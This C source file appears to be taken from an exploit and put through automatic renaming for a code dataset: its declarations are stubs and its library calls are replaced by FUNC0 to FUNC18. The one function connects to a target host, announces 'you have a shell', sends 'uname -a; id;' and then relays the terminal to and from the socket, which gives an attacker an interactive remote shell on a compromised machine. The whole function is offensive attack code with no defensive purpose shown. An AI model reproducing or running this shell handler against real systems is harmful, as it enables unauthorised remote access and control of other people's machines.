#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct in_addr {int dummy; } ;
struct sockaddr_in {int /*<<< orphan*/  sin_zero; struct in_addr sin_addr; int /*<<< orphan*/  sin_port; int /*<<< orphan*/  sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {scalar_t__ h_addr; } ;
typedef  int /*<<< orphan*/  fd_set ;
typedef  int /*<<< orphan*/  buff ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int BUFFERSIZE ; 
 int ERROR ; 
 scalar_t__ FUNC0 (int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC1 (int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int /*<<< orphan*/  TIMEOUT ; 
 scalar_t__ b ; 
 int /*<<< orphan*/  FUNC3 (int /*<<< orphan*/ *,int) ; 
 int FUNC4 (int,struct sockaddr*,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC5 (int) ; 
 int /*<<< orphan*/  FUNC6 (int /*<<< orphan*/ ) ; 
 struct hostent* FUNC7 (char*) ; 
 int /*<<< orphan*/  FUNC8 (char*) ; 
 int /*<<< orphan*/  FUNC9 (int) ; 
 int /*<<< orphan*/  FUNC10 (char*) ; 
 int /*<<< orphan*/  FUNC11 (char*) ; 
 int FUNC12 (int /*<<< orphan*/ ,char*,int) ; 
 int FUNC13 (int,char*,int,int /*<<< orphan*/ ) ; 
 int FUNC14 (int,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ *) ; 
 int FUNC15 (int,char*,int,int /*<<< orphan*/ ) ; 
 int FUNC16 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  stdout ; 
 int FUNC17 (char*) ; 
 int /*<<< orphan*/  FUNC18 (int,char*,int) ; 

void FUNC19(char *host, int port) {
int sockfd, n;
char buff[BUFFERSIZE], *command = "uname -a; id;\n";
fd_set readfs;
struct hostent *he;
struct sockaddr_in dest_dir;

if((he=FUNC7(host)) == NULL) {
FUNC8(" gethostbyname()");
FUNC11("\n");
FUNC5(1);
}

if((sockfd=FUNC16(AF_INET, SOCK_STREAM, 0)) == ERROR) {
FUNC10(" socket()");
FUNC11("\n");
FUNC5(1);
}

dest_dir.sin_family = AF_INET;
dest_dir.sin_port = FUNC9(port);
dest_dir.sin_addr = *((struct in_addr *)he->h_addr);
FUNC3(&(dest_dir.sin_zero), 8);

if(FUNC4(sockfd, (struct sockaddr *)&dest_dir,
sizeof(struct sockaddr), TIMEOUT) == ERROR) {

if(b) {
FUNC11("\r\r");
return;
}

else {
FUNC11(" done!\n\n");
FUNC11(" [!] failed!\n\n");
FUNC5(1);
}
}

if(!b) {
FUNC11(" done!");
FUNC6(stdout);
}

FUNC11("\n\n [!] you have a shell :)\n\n");
FUNC6(stdout);

FUNC15(sockfd, command, FUNC17(command), 0);

while(1) {
FUNC2(&readfs);
FUNC1(0, &readfs);
FUNC1(sockfd, &readfs);
if(FUNC14(sockfd+1, &readfs, NULL, NULL, NULL) < 1) FUNC5(0);
if(FUNC0(0,&readfs)) {
if((n = FUNC12(0,buff,sizeof(buff))) < 1)
FUNC5(0);
if(FUNC15(sockfd, buff, n, 0) != n) FUNC5(0);
}
if(FUNC0(sockfd,&readfs)) {
if((n = FUNC13(sockfd, buff, sizeof(buff), 0)) < 1) FUNC5(0);
FUNC18(1, buff, n);
}
}
}